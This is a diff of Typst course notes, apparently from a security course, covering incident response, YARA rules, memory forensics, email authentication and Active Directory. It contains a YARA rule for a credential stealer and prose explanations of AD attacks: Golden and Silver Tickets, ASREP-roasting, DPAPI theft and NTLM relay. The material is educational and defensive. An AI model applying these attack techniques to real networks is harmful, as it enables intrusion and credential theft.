-  *Example:* *Ist-Zustand:* A spam mail link has been clicked, PC is unusually slow, a window was flashing up quickly,
-  high resource usage, a ransom has popped up, some systems are down. *Soll-Zustand:* Production is running again.
-+ List the impact for the _business_ #hinweis[(Is production still running?)], _company IT_ #hinweis[(are critical
-    systems still running?)] and _stakeholders & communication_ #hinweis[(Has there been a ransom? Does the company
-    board know about the state?)]
+  *Example:*
+  *Ist-Zustand:* A link in a spam mail has been clicked, PC is unusually slow, a window was flashing up quickly,
+  high resource usage, a ransom has popped up, some systems are down.\
+  *Soll-Zustand:* Production is running again.
 
-This must be done by the incident response team, the "Krisenstab". The challenge here is that there must be not only IT
-people present in the team, as they don't have enough business focus for prioritization. Business people must be present
-to determine what to restore first.
++ List the impact for the _business_ #hinweis[(Is production still running?)],
+  _company IT_ #hinweis[(are critical systems still running?)] and
+  _stakeholders & communication_ #hinweis[(Has there been a ransom? Does the company board know about the state?)]
 
-_Key Question:_ Can employees still work? What to do so business is still operative?
+The Bestandsaufnahme must be carried out by the incident response team, the "Krisenstab". The challenge here is that
+there must be not only be IT people present in the team, as they lack the necessary business focus for prioritization.
+Business people must also be present to determine what to restore first.
+
+_Key Question:_ Can employees still work? What can be done so the business is still operating?
 
 *Second Step: Emergency Meeting*\
-Create a 15 minute emergency meeting to share the findings. Is there something known about the attacker? How long will
-the time to recover be?
+Create a 15 minute emergency meeting to share the findings. Is there something known about the attacker?
+How long will the time to recover be?
 
-The communication plan is important: Inform employees first before you go to the press. The head of the incident
-response team decides what to say, not the CEO.
+The communication plan is important: Inform employees first before you inform the press. The head of the incident
+response team decides what to say to the media, not the CEO.
 
 *Third Step: Option Meeting*\
-The emergency meeting is not meant for long discussions, only for status updates. For this purpose are the options
-meeting: Here, different options and measures are discussed.
+The purpose of the emergency meeting is to provide status updates, not to hold long discussions.
+To do so, an Option Meeting is held: Here, different options and measures are discussed in more depth.
 
-=== Example: Ransomware attack
+=== Example Incident Procedure: Ransomware attack
 #grid(
   [
     + Analyze systems
@@ -1417,7 +1448,7 @@ meeting: Here, different options and measures are discussed.
   ],
 )
 
-=== Example: Espionage
+=== Example Incident Procedure: Espionage
 #grid(
   [
     + Check logs and running processes
@@ -1429,7 +1460,6 @@ meeting: Here, different options and measures are discussed.
     5. Silently stop espionage #hinweis[(Attacker shouldn't know they were found)]
     + Analyze what data has been exfiltrated
     + Analyze what data the attacker still has access to
-
   ],
 )
 
@@ -1440,10 +1470,11 @@ meeting: Here, different options and measures are discussed.
 == CyberChef
 CyberChef is a web app for encryption, encoding, compression and data analysis. In can perform a wide range of
 operations, including encoding and decoding, hashing, and making HTTP requests, among many others.
+These operations can be chained together to form a "recipe" to transform data.
 
-*Useful CyberChef functions*
+*Useful CyberChef operations*
 - _Fork:_ Splits input data based on a specified delimiter
-- _Register:_ Stores data in registers so it can be reused by subsequent blocks
+- _Register:_ Stores data in registers so it can be reused by subsequent operations
 - _Filter:_ Filters data using a regular expression
 - _Unique:_ Removes duplicate values
 - _Extract Domains:_ Extracts domain names from the input data
@@ -1462,7 +1493,7 @@ validation, or data fetching.
   CyberChef for further processing.
 
 == YARA
-YARA #hinweis[(Yet another ridiculous acronym)] is a pattern matching and keyword scanner tool designed to detect
+YARA #hinweis[(Yet another ridiculous acronym)] is a _pattern matching_ and _keyword scanner tool_ designed to detect
 malware artifacts on infected system. Since filtering by hashes is very restrictive, YARA uses rules designed to
 identify binary patterns in bulk data.
 
@@ -1477,34 +1508,37 @@ Many other security tools have YARA support built-in, like Velociraptor or Volat
 _first-level triage tool_: Depending on the signature, it can lead to many false positives. Try including additional
 context around the hits to eliminate false positives.
 
-
 === Yara Rules
 Yara rules are written in a custom, C-like format with the `.yar` extension. The two most important sections are
-_`strings`_ and _`conditions`_. In the former, strings and binary patterns to look for are defined, while in the latter,
-the logic of the rule resides. It contains binary expressions to determine whether the rule is satisfied.
+_`strings`_ and _`conditions`_. The former defines the _strings and binary patterns_ to look for, while the latter
+contains the _rule's logic_. It contains binary expressions that determine whether the rule is satisfied.
 
 #table(
   columns: (auto, 1fr),
   table.header([Element], [Description]),
   [Visibility],
-  [Before the rule name. `public` if not specified. `private` rules do not trigger alerts. They can be used to split
-    larger rules into smaller ones.],
+  [
+    Keyword before the rule name. `public` if not specified. `private` rules do not trigger alerts.
+    Visibility can be used to split larger rules into smaller ones.
+  ],
 
-  [Rule name], [At the top after the `rule` keyword. Case-sensitive, alphanumeric and underscore only.],
+  [Rule name], [At the top after the `rule` keyword. Is case-sensitive, is alphanumeric and underscore only.],
   [Tags], [After the rule name and a "`:`". Used for reporting and categorizing rules],
   [`meta:`],
-  [Arbitrary key-value pairs, often specifying author, description and additional resources. Cannot be references in
-    strings or condition],
+  [
+    Arbitrary key-value pairs, often specifying author, description and additional resources.
+    Cannot be referenced in strings or condition
+  ],
 
   [`strings:`],
   [
-    Declare variables. The name starts with a `$` sign. Variable name must be alphanumeric and underscore only. Any
-    string enclosed in forward slashes will be treated as _regex_.
+    Declare variables. The name has to start with a `$` sign. Variable name must be alphanumeric and underscore only.
+    Any string enclosed in forward slashes will be treated as _regex_.
 
-    Strings can have modifiers which are placed behind the value:
+    Strings can have modifiers, which are placed after the value.
     - _`ascii`_: Search for one byte per character #hinweis[(default, can be combined with `wide`)]
-    - _`wide`_: Search for two bytes per character #hinweis[(common in many executable binaries, doesn't fully support
-        UTF-16)]
+    - _`wide`_: Search for two bytes per character
+      #hinweis[(common in many executable binaries, doesn't fully support UTF-16)]
     - _`private`:_ Private strings will never be displayed in YARA output
     - _`nocase`:_ Match case-insensitive on this string
     - _`fullword`:_ Only match if delimited by non-alphanumeric character #hinweis[(e.g. whitespace)]
@@ -1512,12 +1546,16 @@ the logic of the rule resides. It contains binary expressions to determine wheth
     - _`base64`:_ Searches for the base64-encoded variant of the string
   ],
 
-  [`condition:`], [Specifies when this rule should trigger an alert.],
+  [`condition:`],
+  [
+    Specifies when this rule should trigger an alert. Usually checks whether some string has been detected.
+  ],
 )
 
-*Example 1*\
+*Example 1*
+#v(-0.5em)
 ```yar
-rule macrocheck : maldoc {
+rule macrocheck : maldoc { // "maldoc" is a tag
   meta: // this is a comment
     Author = "Fireeye Labs"
     Description = "Identify office documents with the MACROCHECK credential stealer in them..."
@@ -1536,10 +1574,11 @@ rule macrocheck : maldoc {
 ```
 
 *Example 2*
+#v(-0.5em)
 ```yar
 rule foo {
   strings:
-    $a1 = { 64 8B (05|0D|15|1D|25|2D|35|3D) 30 00 00 00 } // any of the values in brackets
+    $a1 = { 64 8B (05|0D|15|1D|25|2D|35|3D) 30 00 00 00 } // any of the values in ( )
     $a2 = {64 A1 30 00 00 00}
     $a3 = {FF 75 ?? FF 55 ?? A?} // ? = any byte
     $a4 = {68 [-3] 07 00 [1-5] FF 15} // [-3] = 0 - 3 bytes in between
@@ -1556,19 +1595,19 @@ A YARA rule generator can analyze patterns in a given binary and automatically g
 identify a malware on different systems after it has been identified. In the exercises, we used YarGen for it.
 
 === Packers
-Most malware today is packed in some way to help get around Antivirus signature detection. They can range from _simple
+Most malware today is packed in some way to help get around Antivirus signature detection. Packing can range from _simple
 compression_ all the way to _full encryption_ or _debugger/sandbox/VM detection_ to make the job of reverse engineering
-them as painful as possible. But packers are not foolproof -- the binary has to be encrypted/decompressed at some point
-to run on the OS.
-
+the malware as painful as possible. But packers are not foolproof -- the binary has to be encrypted/decompressed at some
+point to run on the OS.
 
 
 = Memory Forensics
 Analyzing systems for malicious evidence is known as _forensics_. It typically involves creating a _chain of evidence_
-to reconstruct what actions a malware has taken and identify Indicators of Compromise. Typically, this involves taking a
-image of the hard drive and analyzing the files, network traffic, system logs etc. IoCs can not only be found on hard
-drives, but also in other places where data is stored: _RAM_, _Page files_, _Crash Dumps_ and _Hibernation files_. The
-_Paradigm of Software Protection_ states:
+to reconstruct what actions a malware has taken and to identify Indicators of Compromise (IoC). Typically, this involves
+taking a image of the hard drive and analyzing the files, network traffic, system logs etc. IoCs can not only be found on
+hard drives, but also in other places where data is stored: _RAM_, _Page files_, _Crash Dumps_ and _Hibernation files_.
+
+The _Paradigm of Software Protection_ states:
 #{
   show quote: set align(center)
   v(-0.5em)
@@ -1596,7 +1635,7 @@ claim that someone has tampered with it to their disadvantage. The process is di
   ],
   [
     5. Verify the hashes of the image
-    + Conduct the analysis with the dual control principle #hinweis[(Vier-Augen-Prinzip)]
+    + Conduct the analysis with the dual control principle\ #hinweis[(Vier-Augen-Prinzip)]
     + Write a report based on the findings with signatures by all forensics involved
   ],
   [
@@ -1605,26 +1644,24 @@ claim that someone has tampered with it to their disadvantage. The process is di
   ],
 )
 
-
-
 == Memory Acquisition
 To directly read memory on Windows, the program _requires `SYSTEM` privileges_ #hinweis[(highest possible privileges,
   above Administrator)]. Most tools install a driver that runs as `SYSTEM` to do so. We used WinPmem to test.
 
-On Linux, the most popular option, LiME, required loading a new kernel module. But with AVML, memory can be acquired
-without a kernel module.
+On Linux, the most popular option, LiME, required loading a new kernel module. But with AVML
+#hinweis[(Acquire Volatile Memory for Linux)], a tool by Microsoft, memory can be acquired without a kernel module.
 
 There are also specialized PCIe cards that can do the job, but they are quite expensive. Older 32-bit computers with a
 FireWire port can use Direct Memory Access #hinweis[(DMA)] to access the upper 4GB of RAM.
 
 
 == Memory Smear
-Data in memory can potentially be _modified by the memory acquisition_; this is called _Memory Smear_. There are
-different methods to avoid it:
+Data in memory can potentially be _modified by the memory acquisition_; this is called _Memory Smear_.
+There are different methods to avoid it:
 - _Suspend program execution:_ Use Task Manager to suspend a program. The memory of this program can then be collected
   and the program resumed afterwards. But especially for critical processes, this isn't always possible.
-- _Run in a VM and pause it:_ Run a VM, pause the VM, copy over the files containing the memory #hinweis[(VMWare:
-    `.vmem` files)]. The VM can then be resumed.
+- _Run in a VM and pause it:_ Run a VM, pause the VM, copy over the files containing the memory
+  #hinweis[(VMWare: `.vmem` files)]. The VM can then be resumed.
 - _Hibernation:_ Before a computer hibernates, it writes the entire content of its memory on disk\
   #hinweis[(Windows: `%SystemDrive\hiberfil.sys`)]. Copy over this file by connecting the drive to another computer.
 - _System Crash #hinweis[(Blue Screen/Kernel Panic)]:_ After most system crashes, the memory is also dumped on disk\
@@ -1633,15 +1670,14 @@ different methods to avoid it:
   memory are written to `%WINDIR%\pagefile.sys` #hinweis[(mostly empty if the PC has enough memory)] and\
   `%WINDIR%\swapfile.sys` #hinweis[(Used for idling Microsoft Store apps to save resources)]
 
-
 == Windows processes in memory
-Windows stores all its processes in a doubly-linked list named _`PsActiveProcesses`_. With the pointer in the _kernel
-symbol `nt!PsActiveProcessHead`_, the first element of the list can be accessed -- which is always the `System` process
-with PID 4. All other processes are children of `System`. With the `Flink` #hinweis[(Forward Link)] and `Blink`
+Windows stores all its processes in a doubly-linked list named _`PsActiveProcesses`_. With a pointer stored in the
+_kernel symbol `nt!PsActiveProcessHead`_, the first element of the list can be accessed -- which is always the `System`
+process with PID 4. All other processes are children of `System`. With the `Flink` #hinweis[(Forward Link)] and `Blink`
 #hinweis[(Backward Link)] pointer, the next/previous process can be reached. Since the list is circular, the next
 process after the last running process will be `System` again. Note that the _order of the processes in the list is
 arbitrary_, it is only meant for quickly enumerating all processes on the system. This method is used by _Task Manager_,
-tasklist, Get-Process and pstree.
+`tasklist`, `Get-Process` and `pstree`.
 
 #grid(
   align: horizon,
@@ -1649,12 +1685,12 @@ tasklist, Get-Process and pstree.
     But this doubly-linked list makes it _easy to hide processes_: A process can simply _change the pointers of its
     neighbors_ to remove itself from `PsActiveProcesses`, _rendering it invisible_ to this method of listing all
     processes. Interestingly, unlinking from the list does not have any negative consequences like not getting any CPU
-    time allotted. This is not the case, because the scheduler keeps its own list of processes. Programs like _psscan_
-    can _find hidden processes_ by scanning for signatures of `EPROCESS` #hinweis[(The file structure Windows stores
+    time allotted. This is due to the scheduler keeping its own list of processes. Programs like _psscan_ can
+    _find hidden processes_ by scanning for signatures of `EPROCESS` #hinweis[(The file structure Windows stores
       process information in)] or comparing the contents of `PSActiveProcesses` with the list the CPU scheduler has.
 
   ],
-  image("img/active-processes.png"),
+  figure(caption: [Unlinking a process from `PsActiveProcesses`], image("img/active-processes.png")),
 )
 
 == Memory Analysis with Volatility
@@ -1677,7 +1713,7 @@ prefix in front of the command depending on the memory dump you'd like to analyz
   ],
 )
 
-Volatility 3 requires kernel symbols for the OS you're trying to analyze. Download them from Volatilitys README and
+Volatility 3 requires kernel symbols for the OS you're trying to analyze. Download them from the Volatility README and
 place them into `/opt/applic/volatility3/volatility3/volatility3/symbols`
 
 
@@ -1689,15 +1725,16 @@ There are three main E-Mail security features that enable different aspects of E
 - _Domain-based Message Authentication, Reporting and Conformance (DMARC):_ Unifies SPF and DKIM to allow domain owners
   to declare how they would like E-Mail from their domain to be handled if it fails SPF or DKIM tests
 
-All of these mechanisms are processed on the E-Mail server of the reciever #hinweis[(except DKIM, which also does part
+All of these mechanisms are processed on the _E-Mail server of the receiver_ #hinweis[(except DKIM, which also does part
   of its job on the sender E-Mail server)] and rely on querying data from the DNS of the sender. SPF and DKIM check for
 authenticity of the sender and content, while DKIM provides feedback about those two to the sender domain.
 
-There are external tools to check the configuration of these features like https://mxtoolbox.com
+There are external tools to check the configuration of these features like mxtoolbox.com
 
 == SPF
 Sender Policy Framework (SPF) is designed to _combat email coming from faked senders_. The receiving email server can
-check if the IP the email was sent from and the email in the SPF entry match; if they don't, the sender email has been
+check whether the IP address the email was sent from matches the IP in the SPF entry on the sender's DNS; if not, the sender
+email has been
 spoofed.
 
 To implement SPF, a new `TXT` resource record needs to be created on the DNS. An example SPF entry looks like:
@@ -1711,7 +1748,7 @@ ost.ch. IN  TXT  "v=spf1 mx ip4:192.168.2.10/24 -all"
   [*Version*], [The version of SPF used. Always `v=spf1`, as there hasn't been a SPF2 or later],
   [*Mechanisms*],
   [
-    After the version, mechanisms can be specified to capture certain address in the domain
+    After the version, _"mechanisms"_ can be specified to capture certain addresses in the domain
     - `mx`: Matches any IP that has a `MX` record on the DNS. Most common mechanism.
     - `a`: Matches any IP that has a `A`/`AAAA` record.
     - `ip4/ip6`: Matches any IP in the specified IPv4/IPv6 address range
@@ -1723,8 +1760,8 @@ ost.ch. IN  TXT  "v=spf1 mx ip4:192.168.2.10/24 -all"
 )
 #v(-0.25em)
 When a mail server receives a email, the following _SPF verification steps_ are performed
-+ Read email address in the `MAIL FROM` header
-+ Request all `TXT` records from the domain of the `MAIL FROM` email
++ Read the email address in the `MAIL FROM` header field
++ Request all `TXT` records of the domain in the `MAIL FROM` email address
 + Find the `TXT` record containing SPF information and parse it
 + If SPF record contains mechanisms that point to other DNS records #hinweis[(e.g. `mx` or `a`)], perform additional DNS
   requests to get those IPs
@@ -1735,10 +1772,9 @@ As_ SPF does not validate the `FROM` field_ that contains the sender address the
 successfully spoofed even when SPF is active. DMARC is required to authenticate this field.
 
 == DKIM
-Domain Keys Identified Mail (DKIM) uses private-public encryption to validate the authenticity of a email to verify the
+Domain Keys Identified Mail (DKIM) uses private-public encryption to _validate the authenticity_ of a email to verify the
 email _has not been tampered_ with. To set it up, the sender server must create a key pair and publish the public key
-with some other information as a TXT record on the DNS. An example DNS record looks like this:
-
+together with some other information as a TXT record on its DNS. An example DNS record looks like this:
 ```
 20251204._domainkey.ost.ch. IN  TXT  "v=DKIM1; k=rsa; h=sha256; p=<public key>"
 ```
@@ -1753,17 +1789,19 @@ with some other information as a TXT record on the DNS. An example DNS record lo
   ],
 
   [*`v=`*], [Version of the DKIM standard. Always `DKIM1`],
-  [*`k=`*], [Encryption algorithm. Usually `rsa` or `ed25519`],
-  [*`h=`*], [Hashing algorithm. Usually `sha256`.],
+  [*`k=`*], [Encryption algorithm of the key pair. Usually `rsa` or `ed25519`],
+  [*`h=`*], [Hashing algorithm of the key pair. Usually `sha256`.],
   [*`p=`*], [Public key used for DKIM.],
 )
 
 #grid(
   columns: (1.2fr, 1fr),
   [
-    Before an email is sent, the body and select headers are hashed. These are combined, signed with the private key of
+    Before an email is sent, its body and select headers are hashed. These are concatenated, signed with the private key of
     the mail server and placed in the _`DKIM-Signature` header_ of the email. The header also contains some other
-    metadata, like the signature algorithm, the hash of the message body and what headers were used for the signature.
+    metadata, like the signature algorithm, the hash of the message body and what headers were used for the signature.\
+    *Sample `DKIM-Signature`:*
+    #v(-0.5em)
     ```yaml
     DKIM-Signature: v=1; a=rsa-sha256; d=ost.ch;
       s=20251204; bh=<hash of body> b=<signature>
@@ -1776,7 +1814,7 @@ with some other information as a TXT record on the DNS. An example DNS record lo
     [*`v=`*], [Version of the DKIM standard. Always `1`.],
     [*`a=`*], [Signing algorithm],
     [*`d=`*], [Originating domain],
-    [*`s=`*], [DKIM selector],
+    [*`s=`*], [DKIM selector to use],
     [*`bh=`*], [Hash of the email body],
     [*`b=`*], [Signature of the message],
     [*`h=`*], [The email headers included in the Hashing],
@@ -1784,16 +1822,16 @@ with some other information as a TXT record on the DNS. An example DNS record lo
 )
 
 
-The receiving server then downloads the DKIM DNS entry from the domain specified in the `DKIM-Signature`'s _`d=` key_
-and validates the hash with it. It then calculates the message hash again and compares it to the validated hash in
-`DKIM-Signature`'s _`b=` key_. If they match, the message hasn't been tampered with.
+The receiving server then downloads the DKIM DNS entry, specified in the _`s=` key_, from the domain specified in the
+`DKIM-Signature`'s _`d=` key_ and validates the hash with it. It then calculates the message hash again and compares it
+to the validated hash in `DKIM-Signature`'s _`b=` key_. If they match, the message hasn't been tampered with.
 
 == DMARC
 _Domain-based Message Authentication, Reporting and Conformance (DMARC)_ describes how emails that don't pass SPF or
 DKIM tests should be handled. It is based on three concepts: _Identifier Alignment_, _Policies_ and _Reports_.
 
 === Identifier Alignment
-DMARC verifies if _either SPF or DKIM has succeeded_ and the domain verified by SPF #hinweis[(domain in `MAIL FROM`
+DMARC verifies if _either SPF or DKIM has succeeded_ and if the domain verified by SPF #hinweis[(domain in `MAIL FROM`
   header)] or DKIM #hinweis[(domain in `DKIM-Signature` header)] _matches the domain specified in the `FROM` field_ of
 the email #hinweis[(this is the email displayed as the sender to the user)]. This check is called _Identifier
 Alignment_. _DMARC passes if the Identifier Alignment has been verified._
@@ -1812,10 +1850,10 @@ The policy describes _how emails that failed verification are processed_. Indivi
 domain and subdomains. There are three different policies:
 - _`none`_: Doesn't do anything, usually used for testing
 - _`quarantine`:_ Different actions depending on configuration of the mail server, e.g. flag message or place in spam
-- _`reject`:_ Delete email that fail verification
+- _`reject`:_ Delete emails that fail verification
 
 === Reports
-DMARC can automatically _generate reports of failed verification_ and send them _to the domain those mails were sent
+DMARC can automatically _generate reports of failed verifications_ and send them _to the domain those mails were sent
 from_. The email addresses the reports are sent to are set in the DMARC DNS record. There are two types of reports:
 - _Failure Report/Forensic Report:_ Sends one report per email and consists of possibly redacted copies of the offending
   email.
@@ -1840,40 +1878,44 @@ _dmarc.ost.ch IN  TXT "v=DMARC1; p=quarantine; pct=100; adkim=s; aspf=r;
   [*`v=`*], [DMARC version, always `DMARC1`],
   [*`p=`/`sp=`*], [The DMARC policy used by the main domain and subdomain],
   [*`pct=`*],
-  [Percentage of bad emails on which the policy is applied. If $<$100%, emails that have not been selected will be
+  [
+    Percentage of bad emails on which the policy is applied. If $<$100%, emails that have not been selected will be
     handled by the next, less strict policy #hinweis[`(p=reject` will be handled as `quarantine`, `p=quarantine` as
-      `none`)]],
+      `none`)]
+  ],
 
-  [*`aspf=`/`adkim=`*], [Strictness of SPF/DKIM domain check, either `s` or `r`],
+  [*`aspf=`/`adkim=`*], [Strictness of SPF/DKIM domain check, either `s` (strict) or `r` (relaxed)],
   [*`rua=`/`ruf=`*],
-  [Email addresses the aggregate/forensic reports should be sent to. Must be in `mailto:` format. Multiple addresses can
-    be entered with comma separation],
+  [
+    Email addresses the aggregate/forensic reports should be sent to. Must be in `mailto:` format.
+    Multiple addresses can be entered with comma separation
+  ],
 )
 
 
 = Active Directory
-_Active Directory (AD)_ is a directory service from Microsoft, used centralized management of users, groups and
+_Active Directory (AD)_ is a directory service from Microsoft, providing centralized management of users, groups and
 computers. It manages authentication and authorization #hinweis[(based on LDAP, NTLM, Kerberos, DNS)]. A windows machine
 can be managed by AD by performing a _Domain Join_. The machine can then be added to groups, use AD user accounts and
-access other resources managed by AD. The AD can be managed via the Windows feature _Active Directory Users & Computers_
+access other resources managed by AD. The AD can be managed via the Windows feature _Active Directory Users & Computers_.
 
 *Terminology*
-- _Object:_ Item in AD. Two types: _Resources_ #hinweis[(e.g. Printers)] and _Security Principals_ #hinweis[(users,
-    groups, computers)]
+- _Object:_ Item in AD. Two types: _Resources_ #hinweis[(e.g. Printers)] and _Security Principals_
+  #hinweis[(users, groups, computers)]
 - _Organizational Units (OU):_ Provide folder-like structure to group objects
 - _Container:_ Parent object for certain types of AD objects #hinweis[(Forests, Domains, OUs, Sites, Subnets)]
 - _Group Policy Objects (GPO):_ Admin-defined specifications of policy settings applied to users, groups or computers.
-  Bundles different configuration settings into one. GPOs are linked to domain, site or OU objects and stored in the
-  `SYSVOL` share on the domain controller #hinweis[(`\\mydomain.local\SYSVOL`)]
+  Bundles different configuration settings into one. GPOs can be applied to domain, site or OU objects. The GPOs are
+  stored in the `SYSVOL` share on the domain controller #hinweis[(`\\mydomain.local\SYSVOL`)]
 - _Domain:_ Logical group of network objects. Objects are always collected in a domain. Identified by a DNS name, the
-  namespace
+  "namespace"
 - _Tree:_ Collection of one or more domains or trees. Linked in a transitive trust hierarchy
 - _Forest:_ A single AD instance that has a collection of trees that share a common global catalog. Represents a
   security boundary
 
 *Benefits of AD*
 - _Single-sign on_: The user must login once into their machine and all other services are automatically authenticated
-  with that account. And the user can also log in from any computer joined in the domain.
+  with that account. Additionally, the user can also log in from any computer joined in the domain.
 - _Central Management:_ Policies for groups of users and machines can be applied via Group Policy Objects
   #hinweis[(GPO)]. Examples: Passwords, allowed apps, mapped shares. The policies are applied at boot time and in
   regular intervals
@@ -1886,13 +1928,14 @@ Domains can be bundled in _trees_ and trees in _forests_.
 
 == Windows Permissions
 - _Security Principal:_ Entity that can be authenticated #hinweis[(users, groups, computers)].
-- _Security Identifier (SID):_ Uniquely identify a Security Principal. Access controls are based on SIDs.\ Example SID:
-  `S-1-5-21-1004336348-1177238915-682003330-512`. The digits after the last dash are the _Relative Identifier ID (RID)_
-  of the object in the domain, the rest identifies the domain itself.
+- _Security Identifier (SID):_ Uniquely identify a Security Principal. Access controls are based on SIDs.\
+  Example SID: `S-1-5-21-1004336348-1177238915-682003330-512`. The digits after the last dash are the
+  _Relative Identifier ID (RID)_ of the object in the domain, the rest identifies the domain itself.
 - _Discretionary Access Control (DACL):_ All read, write, execute permissions on a file
 - _System Access Control (SACL):_ Logs attempts to access a secured object
 - _Access Control Entities (ACE):_ Individual permissions per user/group
 - _Access Control List (ACL):_ A list of ACE. The security descriptor of an object can contain DACL or SACL
+
 #image("img/windows-permissions.png")
 
 === Administrator Groups
@@ -1903,7 +1946,7 @@ The most important administrative groups in Active Directory are:
 - _Enterprise Admins:_ Exist only in the forest root. Implicitly added to Domain Admins of every child domain
 - _Schema Admins:_ Can modify the domain/forest schema
 - _Server Operators:_ Can administer domain servers
-- _Account Operators:_ Can manage any user not in a privileged group
+- _Account Operators:_ Can manage any user not in a privileged group #hinweis[(the groups listed above)]
 
 #pagebreak()
 
@@ -1917,13 +1960,14 @@ Kerberos. However, _Kerberos still uses NTLM hashes_ to avoid storing plaintext 
     A client wants to access the SMB server. To do so, it uses NTLM.
     + Negotiate the NTLM Auth details with the SMB server
 
-    + The server generates a random challenge
+    + The server generates a random challenge and sends it to the client.
 
-    + The client loads its _NT Hash_ from LSASS #hinweis[(see @lsass)] and encrypts the challenge with it.
+    + The client loads its _NT Hash_ from LSASS #hinweis[(see @lsass)], encrypts the challenge with it and sends
+      it back to the server.
 
     + The server verifies the response by looking up the account either in its local users or in the Active Directory by
       contacting the domain controller. If the user exists, the challenge can be decrypted and should match what the
-      server sent
+      server sent.
 
     + If the user has the necessary permissions, access to the server is granted
 
@@ -1961,23 +2005,29 @@ Kerberos, see chapter @ad-attacks.
 - _KRBTGT Hash:_ The hash of the Ticket Granting Ticket server, used to create new TGTs.
 - _Machine/Service Hash:_ The hash of a service, used to create new STs.
 
-To request a TGT, users must perform a _Kerberos Pre-Authentication_. The user must encyrpt the current timestamp with
+To _request a TGT_, users must perform a _Kerberos Pre-Authentication_. The user must encrypt the current timestamp with
 their password hash. The KDC can decrypt and verify the timestamp to confirm that the user has _provided the correct
 password_ and that the message is _not a replay attack_.
 
-Pre-Auth does not result in an additional request, it is simply added to the first AS-REQ request. Enabled by default,
-but can be disabled for specific users or for all. Should be avoided as it can lead to the _ASREP-Roasting
+Pre-Auth does not result in an additional request, it is simply added to the first AS-REQ request. Pre-Auth is enabled
+by default, but it can be disabled for specific or all users. Should be avoided as it can lead to the _ASREP-Roasting
 vulnerability_: Any user can request a TGT for any other user. The TGT is encrypted with the target users password hash,
 which allows password cracking attacks.
 
+#pagebreak()
+
+*Regular Kerberos Authentification flow*
+#v(-0.5em)
 #grid(
   columns: (1fr, auto),
   [
-    + When the login credentials have been entered and Pre-Auth has been passed, the client requests a TGT from the
-      Authentication Server
-    + If the credentials are good, a TGT is returned. The client decrypts it with its user hash. With it, the client can
-      now request STs for individual services
-    + The client sends a request to access the file server with the SPN `cifs/foo.local`.
+    + The client encrypts the current timestamp with its password hash. This is the Pre-Auth information.
+    + The client sends its Pre-Auth in a TGT request to the KDC.
+    + The KDC decrypts the timestamp with the users hash stored in its database. It also validates that the timestamp
+      is within the last 5 minutes.
+    + If the credentials are valid and the Pre-Auth has been passed, a TGT is returned.
+      The client decrypts it with its user hash. With it, the client can now request STs for individual services
+    + The client sends a request to the TGS to access the file server with the SPN `cifs/foo.local`.
     + If the client is allowed to access the server, a ST for it is returned
     + The client now presents its ST to the file server. The server checks if the ST is still valid #hinweis[(ST not
         expired)] and returns the result to the client.
@@ -1985,13 +2035,15 @@ which allows password cracking attacks.
   chronos.diagram({
     import chronos: *
     _par("User")
-    _par("Auth", display-name: align(center)[Key Distribution\ Center])
-    _par("TGS", display-name: align(center)[Ticket Granting\ Server])
+    _par("Auth", display-name: align(center)[Key Distribution\ Center (KDC)])
+    _par("TGS", display-name: align(center)[Ticket Granting\ Server (TGS)])
     _par("Server", display-name: align(center)[`foo.local`])
 
-    _seq("User", "Auth", comment: [Request TGT #hinweis[(AS-REQ)]])
+    _seq("User", "User", comment: [Generate Pre-Auth])
+    _seq("User", "Auth", comment: [Request TGT\ with Pre-Auth #hinweis[(AS-REQ)]])
+    _seq("Auth", "Auth", comment: [Validate Pre-Auth])
     _seq("Auth", "User", comment: [Return TGT #hinweis[(AS-REP)]])
-    _seq("User", "TGS", comment: [Request ST for SPN `cifs/foo.local` #hinweis[(TGS-REQ)]])
+    _seq("User", "TGS", comment: [Request ST for SPN\ `cifs/foo.local` #hinweis[(TGS-REQ)]])
     _seq("TGS", "User", comment: [Return ST #hinweis[(TGS-REP)]])
     _seq("User", "Server", comment: [Present ST to access server #hinweis[(AP-REQ)]])
     _seq("Server", "User", comment: [Grant/deny access to client #hinweis[(AP-REP)]])
@@ -2004,11 +2056,11 @@ attackers! _If they gain control of your AD, everything is compromised!_ AD infr
 therefore hard to configure and maintain securely.
 
 *Common misconfigurations and pitfalls*
-- _No segregation of privileged access:_ Highly privileged admins interactively log in on clients/servers
+- _No segregation of privileged access:_ Highly privileged admin accounts interactively log in on clients/servers
 - _Service or user accounts with weak passwords:_ If they have a Service Principal Name #hinweis[(see @kerberos)], the
   password can be cracked and this service compromised
 - _Same local admin password_
-- _Credentials stored on shares with access from "Everyone" group_
+- _Credentials stored on shares with access from the "Everyone" group_
 - _Lack of least-privilege principle_
 
 There are different attack methods that can be ran on an Active Directory. Most of these can be used to gain _lateral
@@ -2016,9 +2068,10 @@ movement_ within the network.
 - _Silver Ticket:_ Forge a Kerberos service ticket or crack a NTLM Hash to generate a new ST to directly authenticate
   without contacting the Key Distribution Center. More stealthily than Golden Ticket, but less powerful
 
-- _Golden Ticket:_ Compromise the KRBTGT hash on the TGT server by extracting the KRBTGT NTLM hash. With it, arbitrary
-  TGTs can be created, allowing the attacker to effectively authenticate on any service in the network. Valid as long as
-  the attacker likes. Can be stopped by changing the KRBTGT hash or changing the account password two times.
+- _Golden Ticket:_ Compromise the KRBTGT hash on the TGT server by extracting the KRBTGT NTLM hash.
+  This allows the attacker to create arbitrary TGTs and effectively authenticate on any service in the network.
+  The Golden Ticket remains valid for as long as the attacker likes. This can be stopped by changing the KRBTGT
+  hash or the KRBTGT account password twice.
 
 - _Passwords in Group Policy Preferences:_ Passwords stored in Group Policy Preferences (GPP) are unencrypted.
 - _Steal credentials stored in DPAPI:_ Chromium stores the login data for websites in the Windows Data Protection API.
@@ -2031,20 +2084,18 @@ movement_ within the network.
   columns: (1fr, auto),
   align: horizon,
   [
-    Intercept the NTLM authentication via MitM and use it to authenticate the at­tacker. This attack works because there
-    is
-    _no way for the client to verifiy the identity_
-    of the server and vice versa.
+    Intercept the NTLM authentication via MitM and use it to authenticate the attacker.
+    This attack works because there is _no way for the client to verifiy the identity_ of the server and vice versa.
 
     + The user makes a NTLM authentication attempt while being the victim of a MitM attack
-    + The attacker forwards the NTLM nego­tiation to the server
+    + The attacker forwards the NTLM negotiation to the server
     + The server, believing the user wants to log in from the attackers machine, sends a challenge to the attacker
     + The attacker forwards the challenge to the client
     + The client sends a NTLM response back, which the Attacker forwards again
-    + The server confirms successful authen­tication to the attacker and the attacker can now perform actions in the
+    + The server confirms successful authentication to the attacker and the attacker can now perform actions in the
       clients name
 
-    _Key point:_ There's no password or hash disclosure, only a live relay of the hand shake.\
